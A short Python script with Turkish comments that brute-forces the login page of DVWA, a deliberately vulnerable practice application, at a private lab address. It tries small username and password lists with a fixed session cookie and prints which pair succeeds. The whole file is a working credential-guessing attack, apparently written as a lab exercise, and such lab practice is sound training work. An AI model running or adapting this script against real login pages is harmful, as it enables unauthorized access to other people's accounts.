import requests
#Cookie ve url bilgisi sizde farklı olabilir
header={"Cookie": "security=low; PHPSESSID=0639ced4e3b12926d1508f2dcf117b00"}
username_list=["admin","password"]
password_liste=["admin","password"]
for i in username_list:
    for j in password_liste:
        url="http://192.168.91.128/dvwa/vulnerabilities/brute/?username="+str(i)+"&password="+str(j)+"&Login=Login"
        sonuc=requests.get(url=url,headers=header)
        print("Username: ",i)
        print("Password: ",j)
        print("Status code: ",sonuc.status_code)
        print("Uzunluk: ",len(sonuc.content))
        if not "Username and/or password incorrect" in str(sonuc.content):
            print("Kullanıcı adı ve parola doğru!!!")
        print("===========================================")

